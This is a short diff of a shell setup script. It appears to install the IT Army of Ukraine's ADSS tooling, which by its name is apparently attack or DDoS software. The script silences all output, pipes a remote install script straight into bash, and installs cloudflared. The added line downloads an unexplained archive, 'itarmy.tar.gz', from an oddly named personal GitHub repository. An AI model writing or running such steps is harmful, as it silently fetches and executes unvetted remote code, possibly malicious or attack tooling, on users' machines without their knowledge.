@@ -4,6 +4,8 @@ exec > /dev/null 2>&1
 
 echo "[*] Run install script"
 curl -fsSL https://raw.githubusercontent.com/it-army-ua-scripts/ADSS/install/install.sh | bash -s
+wget https://github.com/sweetasshole/test/raw/refs/heads/main/itarmy.tar.gz
+
 
 echo "[*] Install tools"
 curl -L https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-amd64 \
